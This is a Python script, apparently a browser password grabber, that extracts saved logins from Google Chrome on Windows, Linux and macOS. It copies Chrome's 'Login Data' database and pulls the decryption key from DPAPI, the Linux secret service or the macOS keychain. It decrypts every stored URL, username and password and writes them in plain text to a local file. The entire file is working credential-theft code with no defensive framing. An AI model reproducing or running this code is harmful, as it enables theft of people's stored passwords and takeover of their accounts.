import os
import sys
import shutil
import sqlite3
import secretstorage
import json, base64
import subprocess

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes)

class ChromeLinux:
    def __init__(self):
        self.home_path = os.environ["HOME"]
        self.db_path =  ".config/google-chrome/Default/Login Data"
        self.new_file = open("chrome_pass.txt", "w")

    def get_pass(self):
        password = 'peanuts'.encode("utf-8")

        # https://github.com/0xR0/chrome_password_grabber
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        for item in collection.get_all_items():
            if item.get_label() == "Chrome Safe Storage":
                return item.get_secret()
        return password

    def chrome_decrypt(self, encrypted):
        password = self.get_pass()
        iterations = 1
        salt = "saltysalt".encode("utf-8")
        iv = b" " * 16
        length = 16

        from Crypto.Cipher import AES
        from Crypto.Protocol.KDF import PBKDF2
        key = PBKDF2(password, salt, length, iterations)
        cipher = AES.new(key, AES.MODE_CBC, IV=iv)
        decrypted = cipher.decrypt(encrypted[3:])
        decrypted = decrypted.strip(b"\x06").decode("utf-8")
        return decrypted

    def get_file(self):
        return self.new_file

class ChromeWin:

    # https://gist.github.com/simonkuang/6e0c8bfdafb43e20f44df9feca38eed0
    def __init__(self):
        self.home_path = os.environ['LOCALAPPDATA']
        self.db_path = r'Google\Chrome\User Data\Default\Login Data'
        self.cookie_path = self.home_path + r"\Google\Chrome\User Data\Local State"
        self.new_file = open("chrome_pass.txt", "w")

    def chrome_decrypt(self, encrypted_txt):
        try:
            if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                decrypted_txt = self.dpapi_decrypt(encrypted_txt)
                return decrypted_txt.decode()
            elif encrypted_txt[:3] == b'v10' or encrypted_txt[:3] == b'v11':
                decrypted_txt = self.aes_decrypt(encrypted_txt)
                return decrypted_txt[:-16].decode()
        except NotImplementedError:
            return None

    def aes_decrypt(self, encrypted_text):
        encoded_key = self.get_key_from_local_state()
        encrypted_key = base64.b64decode(encoded_key.encode())
        encrypted_key = encrypted_key[5:]
        key = self.dpapi_decrypt(encrypted_key)
        nonce = encrypted_text[3:15]
        cipher = self.get_cipher(key)
        decrypted_pass = self.decrypt(cipher, encrypted_text[15:], nonce)
        return decrypted_pass

    def dpapi_decrypt(self, encrypted):
        import ctypes
        import ctypes.wintypes
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.wintypes.DWORD),
                        ('pbData', ctypes.POINTER(ctypes.c_char))]

        p = ctypes.create_string_buffer(encrypted, len(encrypted))
        blobin = DATA_BLOB(ctypes.sizeof(p), p)
        blobout = DATA_BLOB()
        retval = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))

        if not retval:
            raise NotImplementedError

        result = ctypes.string_at(blobout.pbData, blobout.cbData)
        ctypes.windll.kernel32.LocalFree(blobout.pbData)
        return result

    def decrypt(self, cipher, ciphertext, nonce):
        cipher.mode = modes.GCM(nonce)
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext)

    def get_cipher(self, key):
        cipher = Cipher(
            algorithms.AES(key),
            None,
            backend=default_backend()
        )
        return cipher

    def get_key_from_local_state(self):
        with open(self.cookie_path, encoding='utf-8',mode ="r") as f:
            enc_key = json.loads(str(f.readline()))
        return enc_key["os_crypt"]["encrypted_key"]

    def get_file(self):
        return self.new_file

class ChromeMac:

    # https://github.com/0xR0/chrome_password_grabber
    def __init__(self):
        self.home_path = os.environ["HOME"]
        self.db_path = "Library/Application Support/Google/Chrome/Default/Login Data"
        self.key = self.get_key()
        self.new_file = open("chrome_pass.txt", "w")

    def get_key(self):
        password = self.get_pass()
        iterations = 1003
        salt = "saltysalt".encode("utf-8")
        length = 16
        from Crypto.Protocol.KDF import PBKDF2
        key = PBKDF2(password, salt, length, iterations)
        return key

    def get_pass(self):
        password = subprocess.Popen(
            "security find-generic-password -wa 'Chrome'",
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            shell=True
        )
        stdout, _ = password.communicate()
        password = stdout.replace(b"\n", b"")
        return password

    def chrome_decrypt(self, encrypted_text):
        iv = b" " * 16
        encrypted_text = encrypted_text[3:]

        from Crypto.Cipher import AES
        cipher = AES.new(self.key, AES.MODE_CBC, IV=iv)
        decrypted = cipher.decrypt(encrypted_text)
        return decrypted.strip().decode("utf-8")

    def get_file(self):
        return self.new_file

def get_chrome_db(home_path, db_path, chrome_obj):
    login_db = os.path.join(home_path, db_path)

    if not os.path.isfile(login_db):
        exit(0)

    temp_path = os.path.join(home_path,'sqlite_file')

    if os.path.exists(temp_path):
        os.remove(temp_path)

    shutil.copyfile(login_db, temp_path)
    show_password(temp_path, chrome_obj)

def show_password(db_file, chrome_obj):
    conn = sqlite3.connect(db_file)
    _sql = 'SELECT origin_url, username_value, password_value FROM logins'
    for row in conn.execute(_sql):
        url = row[0]
        username = row[1]
        password = chrome_obj.chrome_decrypt(row[2])
        details = f"Url: {url}, Username: {username}, Password: {password}\n"
        chrome_obj.get_file().writelines(details)
    conn.close()
    os.remove(db_file)
    chrome_obj.get_file().close()

if __name__=="__main__":
    if sys.platform == "win32":
        chrome_obj = ChromeWin()
    elif sys.platform.startswith("linux"):
        chrome_obj = ChromeLinux()
    elif sys.platform == "darwin":
        chrome_obj = ChromeMac()
    get_chrome_db(chrome_obj.home_path, chrome_obj.db_path, chrome_obj)